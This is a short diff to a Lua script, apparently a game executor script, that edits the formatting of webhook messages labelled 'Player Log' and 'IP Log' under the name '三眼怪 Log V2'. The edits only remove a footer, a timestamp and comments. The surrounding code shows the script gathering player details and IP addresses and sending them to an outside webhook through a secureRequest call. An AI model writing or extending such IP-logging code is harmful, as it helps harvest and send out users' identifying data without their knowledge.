@@ -83,11 +83,8 @@ pcall(function()
     local playerEmbed = {
         title = "Player Log:",
         description = playerDescription,
-        color = embedColor,
-        footer = {
-            text = "三眼怪 ON TOP"
-        },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        color = embedColor
+        -- 已移除 footer 和 timestamp
     }
 
     -- 5. 準備一個 embeds 陣列，並將第一個 embed 加入
@@ -107,9 +104,9 @@ pcall(function()
         )
 
         local ipEmbed = {
-            title = "IP Log:", -- 這裡的 title 會和上面的 Player Log 一樣大
+            title = "IP Log:",
             description = ipDescription,
-            color = embedColor -- 保持顏色一致
+            color = embedColor
         }
         
         table.insert(embeds, ipEmbed)
@@ -119,7 +116,7 @@ pcall(function()
     local data = {
         username = "三眼怪 Log V2",
         avatar_url = appIconURL,
-        embeds = embeds -- 將包含一個或兩個 embed 的陣列發送出去
+        embeds = embeds
     }
 
     secureRequest({
